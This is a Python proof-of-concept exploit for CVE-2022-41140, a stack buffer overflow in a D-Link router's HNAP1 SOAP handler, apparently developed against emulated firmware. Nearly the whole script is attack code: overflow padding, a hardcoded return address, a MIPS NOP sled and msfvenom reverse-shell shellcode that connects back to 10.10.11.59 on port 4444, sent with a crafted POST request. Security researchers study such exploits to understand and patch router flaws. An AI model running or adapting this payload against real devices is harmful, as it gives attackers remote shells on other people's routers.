#!/usr/bin/env python3

"""
Initial research: https://www.greynoise.io/blog/debugging-d-link-emulating-firmware-and-hacking-hardware
CVE ID: CVE-2022-41140
Exploit Dev by Post Luxembourg Offensive Security - Guillaume Madec

Vulnerability exploitation requires to exit the main loop. At the moment no proper way to exit hence we forced it used the following command line.
$ gdb -batch -ex "attach `pgrep prog.cgi`" -ex "b *0x00429508" -ex "continue" -ex "j *0x00429538" -ex “i f” -ex "p/x $ra"
"""
from pwn import *
import requests

# Print binary security
elf = ELF('/home/kali/Documents/project_1/prog.cgi')

url = 'http://127.0.0.1:8080/HNAP1/?toto=tata'

headers = {
            'User-Agent': 'Edge/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'text/xml; charset=utf-8',
            'SOAPAction': 'http://purenetworks.com/HNAP1/GetDeviceSettings',
            'HNAP_AUTH': '65867429952ADDE4A05A3D701C3CD630 1681481658648',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'http://127.0.0.1:8080',
            'Connection': 'keep-alive',
            'Referer': 'http://127.0.0.1:8080/info/Login.html',
            'Cookie': 'uid=null',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }


data= b'\n\r\n\r<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetDeviceSettings xmlns="http://purenetworks.com/HNAP1/" /></soap:Body></soap:Envelope>'

data += b'A' * 175

data +=p32(0x7fffcc4c)

# NOP sled (XOR $t0, $t0, $t0; as NOP is only null bytes)
# from https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-2/
ptdnop = b'\x26\x40\x08\x01'

data += ptdnop * 64

# badchars = \x00
# msfvenom -p linux/mipsle/shell_reverse_tcp -f py LHOST=10.10.11.59 LPORT=4444 -b '\x00'

buf =  b""
buf += b"\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21"
buf += b"\xfd\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24"
buf += b"\x0c\x01\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f"
buf += b"\xfd\xff\x0f\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf"
buf += b"\x11\x5c\x0e\x3c\x11\x5c\xce\x35\xe4\xff\xae\xaf"
buf += b"\x0b\x3b\x0e\x3c\x0a\x0a\xce\x35\xe6\xff\xae\xaf"
buf += b"\xe2\xff\xa5\x27\xef\xff\x0c\x24\x27\x30\x80\x01"
buf += b"\x4a\x10\x02\x24\x0c\x01\x01\x01\xfd\xff\x11\x24"
buf += b"\x27\x88\x20\x02\xff\xff\xa4\x8f\x21\x28\x20\x02"
buf += b"\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff\xff\x10\x24"
buf += b"\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff\x06\x28"
buf += b"\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf\xaf"
buf += b"\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf"
buf += b"\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf"
buf += b"\xfc\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24"
buf += b"\x0c\x01\x01\x01"
data += buf

x = requests.post(url, headers=headers, data=data)

print(x.text)